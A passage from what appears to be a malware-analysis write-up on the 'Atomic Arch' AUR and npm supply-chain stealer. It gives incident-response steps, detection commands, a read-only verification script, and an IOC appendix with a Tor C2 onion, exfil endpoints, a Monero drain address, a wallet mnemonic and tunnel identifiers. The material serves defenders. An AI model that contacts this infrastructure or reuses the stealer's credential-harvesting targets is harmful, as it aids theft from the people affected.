# so already-installed users were never prompted to upgrade). pacman logs the AUR PACKAGE, not the
# npm payload it pulls at build time, so check two places:
#   1. installed foreign (AUR) packages, cross-referenced against the lenucksi tracker (1,619 pkgs):
pacman -Qmq | grep -Fxf aur-malware-check.txt                          # the lenucksi package list, saved locally
grep -E '\[ALPM\] installed' /var/log/pacman.log | grep '2026-06-1'    # which AUR packages landed, and when
#   2. the bun/npm caches, where the actual payload lands and pacman never looks:
grep -rlE 'atomic-lockfile|lockfile-js|js-digest|nextfile-js' ~/.bun ~/.npm 2>/dev/null

# rootkit + persistence tells (run via bpftool or from clean media, not via ls/ps)
bpftool map show | grep -E 'hidden_(pids|names|inodes)'
bpftool prog show | grep -iE 'tracepoint|kprobe'
# *.service with ExecStart=/var/lib/<8>/<8>, Restart=always
```

**2. The branch that changes the whole response: was the victim a maintainer?** The stealer validates GitHub/npm tokens and enumerates which packages the victim can publish to. If the victim has publish or CI tokens, this is not one laptop, it is every artifact that account can push.
- **Yes** -> treat as a supply-chain incident: rotate publishing tokens first, freeze publishes, audit every release from that account since infection, notify downstream consumers.
- **No** -> contain the host, but still rotate everything below, because the stealer took whatever it could reach.

**3. Credential rotation, in priority order, scoped to the actual theft:**
1. **GitHub PAT + npm token** first. They are the worm's pivot.
2. **Vault.** The token was not just stolen, the malware *enumerated the Vault API*. Assume every secret that token could read is compromised: rotate the secrets, not just the token.
3. **Kubernetes / cloud:** `k3s.yaml` (cluster admin), K8s service-account token, `.aws/credentials`, gcloud `credentials.db`.
4. **SSH and PEM private keys** on the box.
5. **Anything that was in a process environment.** The `/proc/*/environ` sweep burns every secret passed to any running process as an env var, DB passwords, CI tokens, API keys. Rotate those too.
6. Session tokens: Slack, Teams (`skypeToken`), Discord (`mfa.` token), and the `claude:` / Anthropic credential noted above.

**4. Eradication = reimage, not clean.** You cannot prove you removed a rootkit that hides its own files, and persistence is layered (root systemd unit + user unit + the replaced wallet binary + the bpf pins + a dropped exe under a name you cannot list). "Reinstall the official wallet package" fixes the wallet and leaves the rootkit. The only defensible eradication is wipe and rebuild from known-good media.

**5. Preserve evidence before you wipe.** Image the disk, `bpftool prog dump xlated` the rootkit programs, copy the systemd units and `/var/lib/<rand>/<rand>`, and capture memory (the rootkit lives in-kernel). Do this before eradication or the forensic record is gone.

**6. Impact, two irreversible facts.**
- If a funded Monero wallet was opened on this host after infection, assume the balance was swept to `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C`. Monero is private and irreversible: the funds are gone. Tell the user plainly.
- If the proxy side-op ran, the host was an xray exit node carrying attacker traffic, so your network may have been used to attack third parties. That is a notification and legal item, not just cleanup.

**7. Takedown anchors, who to notify with what.** None of the credentials below let you unmask the operator yourself, that is the providers' job and logging into the operator's accounts would itself be unauthorized access. They are the structured handles each provider needs to act:

| Provider | What to send | What they can unmask |
|---|---|---|
| Cloudflare (`abuse@cloudflare.com`) | `ARGO_AUTH` tunnel token: AccountTag `0e1a184426855d762a55cf7287582644`, TunnelID `5fed78e8-d0bb-4b59-be34-e48729ea9a98`, host `dcdeploy.jeongyein520.indevs.in` | the identity and IP behind the account, plus tunnel revocation (token is tunnel-scoped, only Cloudflare can map it to a registrant) |
| GitHub (abuse/legal) | account `fardewoak` (id `187815981`), the `ghcr.io/fardewoak/herbsobering430` image | login IPs and the proxy distribution sink |
| Microsoft (abuse/legal) | the burner email `fardewoak@outlook.com` | registration and IP history behind the email |
| Stackryze (`indevs.in` operator) | subdomain `jeongyein520.indevs.in` | registrant and claim timestamp (cert active since `2026-01-06`) |
| npm / Arch security | publishers `herbsobering` / `brixtai` / `slsnvskse` / `uquque` and the AUR adopter accounts | account registration data |

## reproduce every number {#reproduce}

I do not want one figure in this post taken on faith, so here is the whole verification as a single read-only script. It never executes a sample. It reads bytes, runs the repeating-XOR, inflates the Qt resource streams with `zlib`, and hashes. Point it at the five files and it re-derives every load-bearing IOC: the stage-one hashes, the onion at both per-binary keys with the negative control, the byte-identical eBPF object, the harvest string offsets, the second-stage cleartext negative controls, the `main.qml` carve and the drain block, and the proof that the "three builds" are one truncated binary.

```python
#!/usr/bin/env python3
# Re-derive every load-bearing Atomic Arch IOC from the samples, read-only.
# No sample is executed: this is file reads, a repeating-XOR, zlib inflate, and sha256.
# Usage: verify_atomic_arch.py deps jsdigest_deps.bin bin_linux.elf bin_linux_v2.elf stock/monero-wallet-gui
import sys, hashlib, zlib, struct

deps, jsd, v1, v2, stock = sys.argv[1:6]
ONION = b"olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion"
rd = lambda p: open(p, "rb").read()
ok = bad = 0
def check(label, got, exp):
    global ok, bad
    hit = got == exp; ok += hit; bad += not hit
    print(f"  [{'OK ' if hit else 'XXX'}] {label:42} {got if got==exp else f'{got!r} != {exp!r}'}")

# 1. stage-1 identity
check("deps sha256",      hashlib.sha256(rd(deps)).hexdigest()[:16], "6144d433f8a03168")
check("js-digest sha256", hashlib.sha256(rd(jsd)).hexdigest()[:16],  "7883bda1ff15425f")

# 2. XOR onion (key[i%32]) + negative control, both stealers
def onion(p, koff, coff):
    d = rd(p); k = d[koff:koff+32]; c = d[coff:coff+62]
    return bytes(c[i] ^ k[i % 32] for i in range(62))
check("deps onion @key0x1AA60/ct0x2DA96",   onion(deps, 0x1AA60, 0x2DA96), ONION)
check("js-digest onion @key0x1CBA0/ct0x32BCB", onion(jsd, 0x1CBA0, 0x32BCB), ONION)
check("deps cleartext-onion count",      rd(deps).count(ONION), 0)
check("js-digest cleartext-onion count", rd(jsd).count(ONION),  0)

# 3. embedded eBPF object: identical blob in both stealers (e_machine 247 = BPF)
def carve_bpf(p):
    d = rd(p); i = 0
    while (i := d.find(b"\x7fELF", i)) >= 0:
        if struct.unpack_from("<H", d, i+18)[0] == 247:
            shoff = struct.unpack_from("<Q", d, i+0x28)[0]
            n = struct.unpack_from("<H", d, i+0x3C)[0]
            sz = shoff + n*64
            return i, sz, hashlib.sha256(d[i:i+sz]).hexdigest()[:16]
        i += 1
check("deps bpf @offset/size",      carve_bpf(deps)[:2], (0x324f9, 52776))
check("js-digest bpf @offset/size", carve_bpf(jsd)[:2],  (0x37d91, 52776))
check("bpf object byte-identical",  carve_bpf(deps)[2] == carve_bpf(jsd)[2], True)
check("bpf object sha256",          carve_bpf(deps)[2], "3607de2597f8955f")

# 4. js-digest harvest .rodata literals (file offsets of the string proper)
jd = rd(jsd)
check("GPG argline literal @",   jd.find(b"--batch --no-tty --list-keys"), 0x29c9b)
check("X-Vault-Token header @",  jd.find(b"X-Vault-Token:"),                0x29cd5)
check("/.vault-token path @",    jd.find(b"/.vault-token"),                 0x2c537)

# 5. second-stage cleartext negative controls (the drainer is NOT visible in the ELF)
e = rd(v1)
check("865BH8 drain addr in v1 ELF", e.count(b"865BH8"), 0)
check("createTxAll raw symbol hits (sample)", e.count(b"createTransactionAllAsync"), 9)
check("createTxAll raw symbol hits (stock)",  rd(stock).count(b"createTransactionAllAsync"), 2)

# 6. inflate main.qml from the Qt RCC bundle, diff sample vs stock
def main_qml(p):
    d = rd(p)
    for i in range(len(d)-1):
        if d[i] == 0x78 and d[i+1] in (0x01, 0x9c, 0xda):
            try: dec = zlib.decompressobj().decompress(d[i:i+0x60000])
            except Exception: continue
            if b"onHeightRefreshed" in dec and (b"865BH8" in dec or b"createTransactionAllAsync" in dec):
                return i, dec
def drain_block(q):
    s = q.find(b"if (walletSynced"); depth = 0; started = False; j = s
    while j < len(q):
        if q[j:j+1] == b"{": depth += 1; started = True
        elif q[j:j+1] == b"}":
            depth -= 1
            if started and not depth: return q[s:j+1]
        j += 1
for tag, p, off, usize, sha, calls in [
    ("v1",    v1,    0xc4194a, 97914, "ce8ecab937cf7109", 2),
    ("v2",    v2,    0xc4194a, 97914, "ce8ecab937cf7109", 2),
    ("stock", stock, 0x7df0c8, 97241, "5007f0bb9b579176", 1)]:
    o, q = main_qml(p)
    check(f"{tag} main.qml @offset",  o, off)
    check(f"{tag} main.qml usize",    len(q), usize)
    check(f"{tag} main.qml sha256",   hashlib.sha256(q).hexdigest()[:16], sha)
    check(f"{tag} createTxAll QML call sites", q.count(b"createTransactionAllAsync"), calls)
b = drain_block(main_qml(v1)[1])
check("drain block length",  len(b), 663)
check("drain block sha256",  hashlib.sha256(b).hexdigest()[:16], "488699593ea4bfe4")

# 7. "three builds" are one binary: v2/v3 are byte-prefixes of v1
check("v2 == sha256(v1[:15933790])", hashlib.sha256(e[:15933790]).hexdigest()[:16], "6e4b611243aa2d26")
check("v3 == sha256(v1[:20516912])", hashlib.sha256(e[:20516912]).hexdigest()[:16], "92c40b92e909cd3d")
shoff = struct.unpack_from("<Q", e, 0x28)[0]; n = struct.unpack_from("<H", e, 0x3C)[0]
check("v1 e_shoff + 36*64 == filesize", shoff + n*64, 27787328)
check("drain zlib stream < both truncations", 0xc4194a < 15933790, True)

print(f"\n  {ok} checks reproduced, {bad} failed")
```

Run it against the samples by their conventional names:

```
$ python3 verify_atomic_arch.py deps jsdigest_deps.bin bin_linux.elf bin_linux_6e4b611243aa2d26.elf stock/monero-wallet-gui
  [OK ] deps sha256                                6144d433f8a03168
  [OK ] js-digest sha256                           7883bda1ff15425f
  [OK ] deps onion @key0x1AA60/ct0x2DA96           b'olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion'
  [OK ] js-digest onion @key0x1CBA0/ct0x32BCB      b'olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion'
  [OK ] deps cleartext-onion count                 0
  [OK ] js-digest cleartext-onion count            0
  [OK ] deps bpf @offset/size                      (206073, 52776)
  [OK ] js-digest bpf @offset/size                 (228753, 52776)
  [OK ] bpf object byte-identical                  True
  [OK ] bpf object sha256                          3607de2597f8955f
  [OK ] GPG argline literal @                      171163
  [OK ] X-Vault-Token header @                     171221
  [OK ] /.vault-token path @                       181559
  [OK ] 865BH8 drain addr in v1 ELF                0
  [OK ] createTxAll raw symbol hits (sample)       9
  [OK ] createTxAll raw symbol hits (stock)        2
  [OK ] v1 main.qml @offset                        12851530
  [OK ] v1 main.qml usize                          97914
  [OK ] v1 main.qml sha256                         ce8ecab937cf7109
  [OK ] v1 createTxAll QML call sites              2
  [OK ] v2 main.qml @offset                        12851530
  [OK ] v2 main.qml usize                          97914
  [OK ] v2 main.qml sha256                         ce8ecab937cf7109
  [OK ] v2 createTxAll QML call sites              2
  [OK ] stock main.qml @offset                     8253640
  [OK ] stock main.qml usize                       97241
  [OK ] stock main.qml sha256                      5007f0bb9b579176
  [OK ] stock createTxAll QML call sites           1
  [OK ] drain block length                         663
  [OK ] drain block sha256                         488699593ea4bfe4
  [OK ] v2 == sha256(v1[:15933790])                6e4b611243aa2d26
  [OK ] v3 == sha256(v1[:20516912])                92c40b92e909cd3d
  [OK ] v1 e_shoff + 36*64 == filesize             27787328
  [OK ] drain zlib stream < both truncations       True

  34 checks reproduced, 0 failed
```

Every number comes back. Offsets print in decimal: `171163` is `0x29c9b` (the GPG argline literal, the byte after the `9 ` spillover), `12851530` is `0xc4194a` (the drainer's `main.qml` zlib stream), `8253640` is `0x7df0c8` (the same stream in stock). The truncated SHA-256 prefixes match the full hashes in the appendix below.

That script and the rest of the analysis tooling are in the repo for this post, all read-only, none of them executes a sample: [`verify_atomic_arch.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/verify_atomic_arch.py) (the run above), [`xor_onion.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/xor_onion.py) and [`recover_onion.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/recover_onion.py) (the C2 onion), [`carve_bpf.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/carve_bpf.py) and [`bpf_helpers.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/bpf_helpers.py) (the eBPF object), [`qml_fulldiff.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/qml_fulldiff.py), [`carve_mainqml.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/carve_mainqml.py) and [`decode_xmr_addr.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/decode_xmr_addr.py) (the wallet drainer), [`derive_mnemonic_addrs.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/derive_mnemonic_addrs.py) (the attribution mnemonic), and [`verify_proxy_decoder.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/verify_proxy_decoder.py) with [`decode_argo.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/decode_argo.py) (the proxy and its tunnel token). The index is [`assets/scripts/`](https://github.com/UncleJ4ck/cornfield/tree/main/assets/scripts).

## ioc appendix {#iocs}

A machine-readable copy of everything below is on GitHub: [`atomic-arch-iocs.csv`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/iocs/atomic-arch-iocs.csv) (the `classification` column flags the clean-reference hashes, the withheld access credential, and the not-IOC names). The full tables stay here too.

**File hashes (SHA-256)**

| value | artifact |
|---|---|
| `6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b` | `deps` stage-1 stealer (MalwareBazaar `doNotDetonate`) |
| `7883bda1ff15425f2dbe622c45a3ae105ddfa6175009bbf0b0cad9bf5c79b316` | `js-digest` stage-1 stealer (wave 2) |
| `3607de2597f8955f9a88f36ee43b64d3891b8ef536e99fa098e80169350f7b01` | embedded eBPF rootkit object (identical in both stealers) |
| `47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204` | trojaned `monero-wallet-gui` v1, 27,787,328 B (the one binary) |
| `6e4b611243aa2d261b17a61cd0aa9f3d51b30b8b66a64ead4c0696ae7025aea1` | truncated download of v1, 15,933,790 B |
| `92c40b92e909cd3dd505ea067f77218df00143e9a133a4463a26b217832ad8c0` | truncated download of v1, 20,516,912 B |
| `ce8ecab937cf7109f3b344782cd1cbad680d4477965b235b0a59ce888986c4eb` | trojaned `main.qml` (decompressed) |
| `488699593ea4bfe487d3464924be136af69cd1403494d0373bdba2fd1eac2d3b` | drain block (663 B) |
| `5007f0bb9b579176a66430d935192762490df9e87151ceaaa9201491520c4086` | stock `main.qml` (clean reference, NOT malicious) |
| `ac745b4f5828f9322faccf55359e479f34d3dbbe1153debe64e93bc664abb281` | stock `monero-wallet-gui 0.18.5.0`, 17,552,112 B (clean negative control, NOT malicious) |

**Other file fingerprints**

| type | value | artifact |
|---|---|---|
| BuildID | `41980d03dc3c4809591db0ff17003a82bc067d97` | deps |
| BuildID | `a687aed5d0517aacb74e30737ed33ec470364a30` | js-digest |
| BuildID | `a92f892ea1d50a0240653d4e67c66ae0005c11c0` | wallet v1 |
| BuildID | `35731917e94b5a38bee2eb61bcaa089c28308eb5` | stock wallet (clean) |
| git-describe | `a008085d9` | trojaned wallet build commit (reports version `0.18.5.0`) |
| toolchain | `rustc 1.98.0-nightly (e7815e522 2026-06-04)`, `LLVM 22.1.6` | both stage-1 stealers |
| telfhash | `t16c31de44ac388bfad4a24901ac2515d7c153c67c3410c714ff60dee65eee489f62ae4f` | deps cluster pivot |
| tlsh | `T1FDE56F47F5E148B9C4E9CCB0871FE233EA3574899122B12B6BD89B413B26F209F5D791` | deps fuzzy hash |

**Network**

| type | value | role |
|---|---|---|
| onion | `olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion` | Tor C2 |
| path | `GET /api/mt/` | tasking (machine-id-derived Bearer) |
| path | `POST /upload` | loot exfil |
| path | `/bin/linux`, `/bin/sha256/linux` | second-stage payload + expected hash |
| host | `temp.sh` | wave-1 multipart exfil |
| domain | `dcdeploy.jeongyein520.indevs.in` | CF tunnel front -> `localhost:8001` |
| CF account tag | `0e1a184426855d762a55cf7287582644` | takedown anchor |
| CF tunnel UUID | `5fed78e8-d0bb-4b59-be34-e48729ea9a98` | takedown anchor |
| CF tunnel token | 184-char base64url, structure `{"a":<AccountTag>,"t":<TunnelID>,"s":<secret>}`; reusable secret withheld and reported to Cloudflare | `ARGO_AUTH` connector credential (an access credential, not an indicator) |
| xray UUID | `ff42ddc5-a217-4254-8c23-5a83050703af` | fleet-wide proxy password |
| CFIP front | `saas.sin.fan` | Cloudflare domain-front |
| dist host | `amd64.ssss.nyc.mn/web` (xray-core `7cee3cf29afe22209001d890e4cea28e93c3836d47c2835209317d6ca6871420`), `/bot` (cloudflared, run with `--token $ARGO_AUTH`) | proxy binaries |
| container | `ghcr.io/fardewoak/herbsobering430` | proxy-node recruiter |

**Host artifacts**

| type | value |
|---|---|
| dropped exe | `/var/lib/<rand8>/<rand8>` (e.g. `/var/lib/moge/moge`), mode 0700 |
| persistence | `/etc/systemd/system/<rand8>.service`, `~/.config/systemd/user/<rand8>.service` (`Restart=always RestartSec=30`) |
| bpf pins | `/sys/fs/bpf/<rand8>/{hidden_pids,hidden_names,hidden_inodes}` |
| replaced binary | `/usr/bin/monero-wallet-gui` |
| eBPF build path | `/cloud/scales/agent/../ebpf/scales.bpf.c` |

**Crypto and attribution**

| type | value |
|---|---|
| XMR drain subaddress | `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C` (net 42, checksum `a95b1d99`) |
| BIP-39 mnemonic | `bench crane defense corn wheel trial news abuse finish better paddle slush` |
| derived ETH (anchor) | `0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6` (virgin, also IronWorm's artifact) |
| persona | `fardewoak` (GitHub id 187815981, `fardewoak@outlook.com`); LOW confidence as a human |

**Packages and accounts**

| type | value |
|---|---|
| npm packages | `atomic-lockfile@1.4.2`, `lockfile-js@1.4.2`, `js-digest@4.2.2`, `nextfile-js@1.4.2` |
| npm publishers | `brixtai`, `slsnvskse`, `uquque`; umbrella `herbsobering` |
| AUR adopters | `krisztinavarga`, `franziskaweber`, `tobiaswesterburg`, `ellenmyklebust`, `custodiatovar`, `veramagalhaes` |
| forged commit author | `PLYSHKA` |

**NOT IOCs (do not flag these)**

| value | why it is innocent |
|---|---|
| `arojas` | impersonated KDE maintainer, a victim of the forgery |
| `hanxi2014`, `jhruby`, `appro`, `eooce` | upstream authors whose names ride on inherited commits / copied libraries |
| `pingwin840` | post-disclosure copycat scareware account, not the operator |

## references {#references}

**Prior analysis and coverage of this campaign** (this post builds on all of it):

- [Whanos](https://github.com/Whanos), reverse-engineering of the stage-one `deps` stealer, writeup at [ioctl.fail "Preliminary analysis of AUR malware"](https://ioctl.fail/preliminary-analysis-of-aur-malware/): the XOR-encoded onion and its offsets, `/api/mt/` C2, `temp.sh` exfil, eBPF rootkit, persistence, target matrix
- [CSA Labs research note](https://labs.cloudsecurityalliance.org/research/csa-research-note-aur-supply-chain-ebpf-rootkit-20260614-csa/), AUR supply chain and the eBPF rootkit
- [Sonatype: Atomic Arch npm campaign](https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency), campaign tracking (Sonatype-2026-003775 / -003808)
- [lenucksi/aur-malware-check](https://github.com/lenucksi/aur-malware-check), affected-package list and scanner
- SafeDep threat intel: [IronWorm](https://safedep.io/ti/campaigns/ironworm/) and [Atomic Arch](https://safedep.io/ti/campaigns/atomic-arch/)
- Incident coverage: [BleepingComputer](https://www.bleepingcomputer.com/news/security/over-400-arch-linux-packages-compromised-to-push-rootkit-infostealer/), [The Hacker News](https://thehackernews.com/2026/06/over-400-arch-linux-aur-packages.html)

**Technical references:**

- [Monero GUI source, `Wallet::createTransactionAllAsync`](https://github.com/monero-project/monero-gui/blob/v0.18.5.0/src/libwalletqt/Wallet.cpp), pinned to the `v0.18.5.0` tag the trojan was rebuilt from, sweep-all semantics (an empty amount maps to `createTransactionMultDest` spending the full unlocked balance)
- Qt RCC resource format, `qt_resource_struct` / `qt_resource_name` / `qt_resource_data` layout and the per-file zlib stream
- Monero base58 address format, network byte 42 (mainnet subaddress) and the keccak-256 four-byte checksum
- [Intel Software Development Emulator](https://www.intel.com/content/www/us/en/developer/articles/tool/software-development-emulator.html) (`sde64 -spr`), userspace AVX-512 emulation for the `-march=native` build
- [MITRE ATT&CK](https://attack.mitre.org/), the technique mappings in the matrix above
- BIP-39 / BIP-32 / BIP-44 / BIP-49 derivation, validated against the canonical test vector
